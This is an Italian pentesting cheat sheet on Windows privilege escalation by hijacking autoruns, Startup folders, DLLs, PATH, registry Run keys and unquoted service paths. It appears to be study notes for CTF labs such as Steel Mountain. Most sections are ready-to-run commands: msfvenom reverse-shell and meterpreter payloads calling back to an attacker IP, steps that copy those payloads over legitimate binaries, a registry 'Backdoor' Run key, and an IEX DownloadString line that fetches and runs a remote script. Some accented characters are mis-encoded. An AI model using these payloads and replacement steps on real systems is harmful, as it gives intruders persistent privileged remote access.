#Privesc_Windows 

---
#### INDICE

- [[#Introduzione]]
- [[#File Hijacking]]
	1. [[#Autorun64.exe]]
	2. [[#Startup Folder]]
- [[#DLL Hijacking]]
- [[#PATH Environment Hijacking]]
- [[#Registry-Based Hijacking]]
- [[#Unquoted Service Path]]
	1. [[#Enumerazione]]
	2. [[#Fasi Operative]]

---
---
---
### Introduzione
Gli attacchi di¬†**Hijacking**¬†sfruttano meccanismi di esecuzione automatica e di ricerca di Windows per sostituire componenti legittimi con codice malevolo. Queste vulnerabilit√† si verificano quando:

- **Programmi/configurazioni** con permessi insicuri
- **Percorsi di esecuzione non quotati**
- **Meccanismi di trust del sistema operativo** vengono manipolati per ottenere l'esecuzione di codice con privilegi elevati.
---
#### Autorun64.exe
`Autoruns64.exe` mostra tutti i programmi che partono automaticamente al login.

Eseguire `Autoruns64.exe` sulla macchina target per vedere cosa parte automaticamente:

```
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```

Tra i programmi listati controllare i permessi di ogni cartella:

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```

Se il risultato √®  `Everyone: FILE_ALL_ACCESS` o comunque l'utente attualmente in possesso, √® possibile sostituire il file in esecuzione con uno malevolo.
Creiamo un file malevolo (*reverse shell*) nel seguente modo:

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP_KALI> -f exe -o program.exe
```

E sostituiamo il programma legittimo con quello malevolo:

```
copy program.exe "C:\Program Files\Autorun Program\program.exe"
```

Al prossimo login, program.exe malevolo viene eseguito AUTOMATICAMENTE.

#### Startup Folder
Qualsiasi script o programma all'interno della cartella `StartUp` sono eseguiti in automatico quando un utente effettua il login.

Controlliamo i permessi delle seguenti cartelle:
1. `C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`
2. `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\`

Se si hanno i permessi di scrittura, √® possibile inserire un file malevolo (es: *reverse shell*) in formato `.bat`, `.ps1` o `.exe` per avviare una connessione verso la kali:

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP_KALI> -f exe -o program.exe
```

E sostituiamo il programma legittimo con quello malevolo:

```
copy program.exe "C:\Program Files\Autorun Program\program.exe"
```

Al prossimo login, program.exe malevolo viene eseguito AUTOMATICAMENTE.

---
### DLL Hijacking
Windows cerca le DLL in questo ordine:
1. Directory dell'applicazione
2. Directory di sistema
3. Directory corrente
4. Directory nel PATH

Se una DLL mancante √® in una directory con permessi di scrittura, pu√≤ essere sostituita.

Per trovare la DLL mancante utilizziamo [Procmon.exe]():

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_KALI> -f dll -o missing.dll
copy missing.dll "C:\Program\VulnerableApp\missing.dll"
```

All'avvio dell'app, caricher√† la DLL malevola.

---
### PATH Environment Hijacking
La variabile d'ambiente PATH serve ad indicare al Sistema Operativo dove cercare i programmi con percorso relativo. Se abbiamo i permessi per modificare la variabile allora possiamo sfruttarli per inserire un file malevolo con lo stesso nome.

Identifichiamo i comandi eseguiti senza path assoluto:

```
echo %PATH%
```

Cerchiamo comandi chiamati relativamente ed aggiungiamo directory al PATH:

```
set PATH=C:\temp;%PATH%
```

Creiamo un eseguibile malevolo con lo stesso nome:

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> -f exe -o ping.exe
copy ping.exe C:\temp\ping.exe
```

Quando qualcuno eseguir√† il programma sostituito, si avvier√† la *reverse shell*.

---
### Registry-Based Hijacking
Modifica delle chiavi di registro che eseguono programmi automaticamente.

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
```

Aggiungiamo un programma malevolo

```
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\temp\shell.exe"
```

---
### Unquoted Service Path
La vulnerabilit√†¬†**Unquoted Service Path**¬†si verifica quando il percorso di un servizio Windows non √® racchiuso tra virgolette e contiene spazi. Questo permette a un attaccante di eseguire codice con privilegi elevati inserendo un eseguibile malevolo in una posizione che il servizio caricher√† prima del binario legittimo.

Quando un servizio Windows viene avviato, il **Service Control Manager (SCM)** cerca l'eseguibile in questo ordine:
1. Percorso completo tra virgolette
2. **Se non quotato**: Cerca in ogni directory del percorso finch√© non trova un eseguibile valido

**Esempio vulnerabile**:
`C:\Program Files\Vulnerable App\Service.exe`

SCM cercher√† in ordine:
1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. `C:\Program Files\Vulnerable App\Service.exe`
#### Enumerazione
Possiamo scoprire i file vulnerabili tramite:

```
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i auto
```

O tramite Powershell

```
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -like "* *"} | Select-Object Name, DisplayName, State, PathName
```

O tramite sc query:

```
sc query state= all | findstr SERVICE_NAME
sc qc "ServiceName"
```

Possiamo automatizzare l'enumerazione con strumenti come [winpeas.ps1](https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1) :

```
.\winpeas.ps1
```

O [PowerUp.ps1](https://raw.githubusercontent.com/HarmJ0y/PowerUp/refs/heads/master/PowerUp.ps1):

```
IEX(New-Object Net.WebClient).DownloadString('http://<IP>/PowerUp.ps1')
Invoke-AllChecks
```

#### Fasi Operative
Oltre al percorso non quotato, √® necessario avere¬†**permessi di scrittura**¬†su almeno una directory nel percorso:

Verifichiamo i permessi:

```
icacls "C:\Program Files"
icacls "C:\Program Files\Vulnerable App"
```

Il servizio deve essere eseguito con **account privilegiati (es: SYSTEM, Administrator)**:

```
sc qc "VulnerableService" | findstr "SERVICE_START_NAME"
```

Come terzo step creiamo il file malevolo che sostituir√† il servizio:

```
#msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe -o VULNERABLE_SRV.exe
```

```
#meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe > shell.exe
```

Sostituiamo il file malevolo con quello originale:

```
copy shell.exe "C:\Program Files\My.exe"
```

Riavviamo il servizio:

```
# SC
sc stop "VulnerableService"
sc start "VulnerableService"
```

```
# Net
net stop "VulnerableService"
net start "VulnerableService"
```

```
# PowerShell
Restart-Service -Name "VulnerableService"
```

Se il servizio non si pu√≤ riavviare, allora riavviamo il sistema:

```
shutdown /r /t 0
```

üìö‚Äã Writeups:
- *Active Directory:*[[üìö WRITEUPS/üåç Ambienti/Active Directory#Enterprise| Enterprise]],
- *Windows:*[[Windows#Steel Mountain| Steel Mountain]],